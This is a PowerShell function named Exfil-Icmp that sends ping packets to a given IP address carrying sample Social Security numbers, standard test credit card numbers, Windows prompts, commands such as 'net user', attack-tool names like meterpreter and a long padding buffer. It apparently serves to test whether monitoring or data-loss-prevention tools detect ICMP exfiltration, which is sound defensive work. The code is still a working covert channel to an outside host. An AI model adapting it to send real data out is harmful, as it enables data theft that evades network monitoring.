

function Exfil-Icmp
{ 
           
    [CmdletBinding()] Param(

        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $IPAddress

    )

    
    $ICMPClient = New-Object System.Net.NetworkInformation.Ping
    $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
    $PingOptions.DontFragment = $True


        $sendbytes = ([text.encoding]::ASCII).GetBytes('testing 1')
        $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null

        $sendbytes = ([text.encoding]::ASCII).GetBytes('SSN 1 - 123-45-6789') 
        $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null

        $sendbytes = ([text.encoding]::ASCII).GetBytes('SSN 1 - 123-45-6789')
        $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null

        $sendbytes = ([text.encoding]::ASCII).GetBytes('SSN 2 - 123.45.6789')
        $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null

        $sendbytes = ([text.encoding]::ASCII).GetBytes('SSN 3 - 123456789')
        $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null

        $sendbytes = ([text.encoding]::ASCII).GetBytes('Credit Card Amex 1 - American Express 378282246310005')
	    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
	
        $sendbytes = ([text.encoding]::ASCII).GetBytes('Credit Card Amex 2 - American Express 371449635398431')
	    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
	
        $sendbytes = ([text.encoding]::ASCII).GetBytes('Credit Card Amex 3 - American Express Corporate 378734493671000')
	    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
	
        $sendbytes = ([text.encoding]::ASCII).GetBytes('Credit Card Austr 1 - Australian BankCard 5610591081018250')
	    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
	
        $sendbytes = ([text.encoding]::ASCII).GetBytes('Credit Card Diners 1 - Diners Club 30569309025904')
	    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
	
        $sendbytes = ([text.encoding]::ASCII).GetBytes('Credit Card Diners 2 - Diners Club 38520000023237')
	    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
	
        $sendbytes = ([text.encoding]::ASCII).GetBytes('Credit Card Disco 1 - Discover 6011111111111110')
	    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
	
        $sendbytes = ([text.encoding]::ASCII).GetBytes('Credit Card Disco 2 - Discover 6011000990139420')
	    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
	
        $sendbytes = ([text.encoding]::ASCII).GetBytes('Credit Card JCB 1 - JCB 3530111333300000')
	    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
	
        $sendbytes = ([text.encoding]::ASCII).GetBytes('Credit Card JCB 2 - JCB 3566002020360500')
	    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
	
        $sendbytes = ([text.encoding]::ASCII).GetBytes('Credit Card JCB 2 - JCB 3566002020360500')
	    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
	
        $sendbytes = ([text.encoding]::ASCII).GetBytes('Credit Card Master 1 - MasterCard 5555555555554440')
	    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
	
        $sendbytes = ([text.encoding]::ASCII).GetBytes('Credit Card Master 2 - MasterCard 5105105105105100')
	    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
	
        $sendbytes = ([text.encoding]::ASCII).GetBytes('Credit Card Maestro 1 - Maestro 6799990100000000019')
	    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
	
        $sendbytes = ([text.encoding]::ASCII).GetBytes('Credit Card Visa 1 - Visa 4111111111111110')
	    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
	
        $sendbytes = ([text.encoding]::ASCII).GetBytes('Credit Card Visa 2 - Visa 4012888888881880')
	    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
	
        $sendbytes = ([text.encoding]::ASCII).GetBytes('Credit Card Visa 3 - Visa 4222222222222')
	    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
	
        $sendbytes = ([text.encoding]::ASCII).GetBytes('Credit Card Visa Deb 1 - Visa Debit 4917610000000000003')
	    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null

        $sendbytes = ([text.encoding]::ASCII).GetBytes('C:\')
	    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null

        $sendbytes = ([text.encoding]::ASCII).GetBytes('C:\Windows>')
	    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null

        $sendbytes = ([text.encoding]::ASCII).GetBytes('C:\Windows\System32>')
	    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null

        $sendbytes = ([text.encoding]::ASCII).GetBytes('C:\Program Files>')
	    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null

        $sendbytes = ([text.encoding]::ASCII).GetBytes('dir')
	    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null

        $sendbytes = ([text.encoding]::ASCII).GetBytes('net use')
	    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null

        $sendbytes = ([text.encoding]::ASCII).GetBytes('net user')
	    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null

        $sendbytes = ([text.encoding]::ASCII).GetBytes('unattend')
	    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null

        $sendbytes = ([text.encoding]::ASCII).GetBytes('sysprep')
	    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null

        $sendbytes = ([text.encoding]::ASCII).GetBytes('groups.xml')
	    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null

        $sendbytes = ([text.encoding]::ASCII).GetBytes('powertools')
	    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null

        $sendbytes = ([text.encoding]::ASCII).GetBytes('powersploit')
	    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null

        $sendbytes = ([text.encoding]::ASCII).GetBytes('metasploit')
	    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null

        $sendbytes = ([text.encoding]::ASCII).GetBytes('meterpreter')
	    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null

        $sendbytes = ([text.encoding]::ASCII).GetBytes('beacon')
	    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null

        $sendbytes = ([text.encoding]::ASCII).GetBytes('shell')
	    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null

        $sendbytes = ([text.encoding]::ASCII).GetBytes('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
        $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
}

